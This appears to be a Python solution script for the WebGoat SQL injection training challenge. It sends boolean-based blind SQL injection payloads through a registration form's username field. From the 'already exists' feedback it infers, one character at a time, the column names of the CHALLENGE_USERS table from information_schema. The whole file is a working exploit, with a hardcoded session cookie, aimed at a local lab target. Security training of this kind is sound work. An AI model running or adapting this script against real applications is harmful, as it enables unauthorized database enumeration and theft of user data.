
import json
import requests

# Character set for guessing the column names
CHAR_SET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_'

# Vulnerable endpoint URL
URL = 'http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge'

# Request headers
HEADERS = {
    'Cookie': "JSESSIONID=stwGcaftyQKVEJJ0zFtNGJXVBHNWGCfPLJnWcWBG",
}

def extract_column_names(prefix):
    current_column_prefix = prefix
    discovered_columns = []

    while True:
        char_found = False

        for character in CHAR_SET:
            # Constructing SQL injection payload to verify column names
            payload = "tom' AND EXISTS (SELECT 1 FROM information_schema.columns WHERE table_name = 'CHALLENGE_USERS' AND column_name LIKE '{}%');--".format(current_column_prefix + character)

            request_data = {
                'username_reg': payload,
                'email_reg': 'test@example.com',
                'password_reg': 'password',
                'confirm_password_reg': 'password'
            }

            # Sending the request to the vulnerable endpoint
            response = requests.put(URL, headers=HEADERS, data=request_data)

            try:
                response_json = response.json()
            except json.JSONDecodeError:
                print("Error: Could not parse the response. Please check your session details.")
                return

            # If the response indicates a successful match
            if "already exists please try to register with a different username" in response_json.get('feedback', ''):
                current_column_prefix += character
                print(f"Current column name prefix: {current_column_prefix}")
                char_found = True
                break

        if not char_found:
            if current_column_prefix != prefix:
                discovered_columns.append(current_column_prefix)
                print(f"Column found: {current_column_prefix}")
            else:
                print(f"Not found starting with {prefix}")
            break

    return discovered_columns

# Extract column names starting with each character and print all discovered columns
all_columns = []
for prefix in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
    print(f"Checking columns starting with {prefix}")
    columns = extract_column_names(prefix)
    all_columns.extend(columns)

print("\nAll discovered columns:")
for column in all_columns:
    print(column)
